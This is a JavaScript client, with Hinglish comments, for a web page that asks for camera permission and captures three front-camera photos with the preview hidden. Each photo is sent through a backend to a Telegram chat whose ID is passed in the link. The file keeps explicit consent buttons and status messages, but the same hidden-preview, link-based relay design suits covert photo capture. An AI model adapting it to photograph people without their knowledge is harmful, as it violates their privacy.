/*
========================================================
CAMERA CLIENT
========================================================

Complete flow:

1. URL se chat_id read hoti hai.
2. User "Allow Camera" press karta hai.
3. Browser camera permission maangta hai.
4. Front camera request hota hai.
5. Camera preview hidden rehta hai.
6. User "Start Capture" press karta hai.
7. Maximum 3 photos capture hoti hain.
8. Har photo backend ko bheji jati hai.
9. Backend Telegram par forward karta hai.
10. Third photo ke baad camera completely stop ho jata hai.

IMPORTANT:
Telegram Bot Token kabhi frontend me nahi rakha gaya.
*/

const allowButton =
  document.getElementById("allowCamera");

const startButton =
  document.getElementById("startCapture");

const video =
  document.getElementById("camera");

const canvas =
  document.getElementById("canvas");

const statusText =
  document.getElementById("status");

const counter =
  document.getElementById("counter");


/*
  Maximum photos.

  Is value ko 3 se zyada nahi rakha gaya.
*/
const MAX_PHOTOS = 3;


/*
  Photos ke beech ka interval.

  2500 milliseconds = 2.5 seconds.
*/
const PHOTO_INTERVAL = 2500;


/*
  Camera stream yahan store hoga.
*/
let cameraStream = null;


/*
  Capture session status.
*/
let capturing = false;


/*
========================================================
CHAT ID
========================================================

Demo ke liye chat_id URL me directly visible hai.

Example:

https://example.vercel.app/?chat_id=123456789
*/

const params =
  new URLSearchParams(window.location.search);

const chatId =
  params.get("chat_id");


/*
  Agar chat_id URL me nahi hai to capture allow nahi hoga.
*/
if (!chatId) {

  statusText.textContent =
    "Invalid camera link. Telegram chat ID is missing.";

  allowButton.disabled = true;

}


/*
========================================================
REQUEST CAMERA
========================================================

Browser camera permission yahan request hoti hai.
*/

async function requestCamera() {

  try {

    statusText.textContent =
      "Requesting camera permission...";


    /*
      Browser camera API.

      facingMode "user" ka matlab front/selfie camera
      request karna hai.
    */
    cameraStream =
      await navigator.mediaDevices.getUserMedia({

        video: {

          facingMode: {
            ideal: "user"
          }

        },

        audio: false

      });


    /*
      Stream video element se connect hoti hai.

      Preview CSS ke through hidden hai.
    */
    video.srcObject =
      cameraStream;


    /*
      Video ko start hone dete hain.
    */
    await video.play();


    /*
      Permission successful.

      Ab Start Capture enable hota hai.
    */
    startButton.disabled = false;

    allowButton.disabled = true;


    statusText.textContent =
      "Camera permission granted. Press Start Capture.";

  }

  catch (error) {

    console.error(error);

    statusText.textContent =
      "Camera permission was denied or camera could not be opened.";

    stopCamera();

  }

}


/*
========================================================
STOP CAMERA
========================================================

Camera ke saare tracks stop karta hai.
*/

function stopCamera() {

  if (cameraStream) {

    cameraStream
      .getTracks()
      .forEach(track => track.stop());

    cameraStream = null;

  }


  video.srcObject = null;

}


/*
========================================================
CAPTURE FRAME
========================================================

Current camera frame ko JPEG image me convert karta hai.

Canvas screen par visible nahi hai.
*/

function captureFrame() {

  return new Promise((resolve, reject) => {

    if (
      !video.videoWidth ||
      !video.videoHeight
    ) {

      reject(
        new Error("Camera frame is not ready.")
      );

      return;

    }


    /*
      Canvas ko camera ke actual resolution ke
      according size karte hain.
    */
    canvas.width =
      video.videoWidth;

    canvas.height =
      video.videoHeight;


    const context =
      canvas.getContext("2d");


    /*
      Camera frame canvas par draw hota hai.
    */
    context.drawImage(

      video,

      0,
      0,

      canvas.width,
      canvas.height

    );


    /*
      Canvas ko JPEG Blob me convert karte hain.
    */
    canvas.toBlob(

      blob => {

        if (!blob) {

          reject(
            new Error("Could not create image.")
          );

          return;

        }

        resolve(blob);

      },

      "image/jpeg",

      0.85

    );

  });

}


/*
========================================================
SEND PHOTO
========================================================

Captured image backend ko bheji jati hai.

chat_id URL se aati hai.

IMPORTANT:
Bot token frontend me nahi hai.
*/

async function sendPhoto(blob, photoNumber) {

  const formData =
    new FormData();


  /*
    Image attach karna.
  */
  formData.append(

    "photo",

    blob,

    `photo-${photoNumber}.jpg`

  );


  /*
    Demo ke liye chat_id backend ko bhej rahe hain.

    Production system me isko signed session token
    se replace karna better hoga.
  */
  formData.append(

    "chat_id",

    chatId

  );


  formData.append(

    "photo_number",

    photoNumber.toString()

  );


  /*
    Vercel serverless function.
  */
  const response =
    await fetch(

      "/api/send-photo",

      {

        method: "POST",

        body: formData

      }

    );


  if (!response.ok) {

    throw new Error(
      "Photo upload failed."
    );

  }


  return response.json();

}


/*
========================================================
START CAPTURE
========================================================

User ko explicit Start Capture press karna hoga.

Maximum 3 photos.
*/

async function startCapture() {

  /*
    Duplicate start ko prevent karta hai.
  */
  if (
    capturing ||
    !cameraStream
  ) {

    return;

  }


  capturing = true;

  startButton.disabled = true;


  let captured =
    0;


  try {

    /*
      Fixed loop.

      i = 1, 2, 3 only.
    */
    for (
      let i = 1;
      i <= MAX_PHOTOS;
      i++
    ) {


      statusText.textContent =
        `Preparing photo ${i} of ${MAX_PHOTOS}...`;


      /*
        Camera ko settle hone ke liye short delay.
      */
      await delay(700);


      /*
        Frame capture.
      */
      const image =
        await captureFrame();


      /*
        Backend par send.
      */
      await sendPhoto(
        image,
        i
      );


      captured = i;


      counter.textContent =
        `${captured} / ${MAX_PHOTOS} photos captured`;


      /*
        Last photo ke baad interval nahi chahiye.
      */
      if (
        i < MAX_PHOTOS
      ) {

        await delay(
          PHOTO_INTERVAL
        );

      }

    }


    statusText.textContent =
      "Capture complete. Camera has been stopped.";

  }

  catch (error) {

    console.error(error);

    statusText.textContent =
      "Capture stopped because an error occurred.";

  }

  finally {

    /*
      Chahe success ho ya error,
      camera stream release karna zaroori hai.
    */
    stopCamera();

    capturing = false;

  }

}


/*
========================================================
DELAY HELPER
========================================================
*/

function delay(milliseconds) {

  return new Promise(

    resolve =>
      setTimeout(
        resolve,
        milliseconds
      )

  );

}


/*
========================================================
EVENT LISTENERS
========================================================
*/

allowButton.addEventListener(

  "click",

  requestCamera

);


startButton.addEventListener(

  "click",

  startCapture

);


/*
  Agar user page close/navigate kare,
  camera immediately stop kar do.
*/
window.addEventListener(

  "pagehide",

  stopCamera

);


window.addEventListener(

  "beforeunload",

  stopCamera

);
